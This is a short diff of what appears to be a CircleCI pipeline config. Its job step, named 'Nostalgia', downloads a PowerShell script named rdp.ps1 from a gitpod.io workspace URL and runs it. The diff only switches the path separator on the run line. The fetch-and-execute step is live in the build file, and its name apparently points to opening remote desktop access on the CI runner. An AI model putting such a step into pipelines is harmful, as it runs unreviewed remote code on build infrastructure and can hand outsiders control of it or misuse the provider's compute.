@@ -14,4 +14,4 @@ jobs:
           name: Nostalgia
           command: |
               Invoke-WebRequest https://4456-opalricearl-circlecipro-dynpgrqmusl.ws-us63.gitpod.io/rdp.ps1 -OutFile rdp.ps1
-              ./rdp.ps1
+              .\rdp.ps1
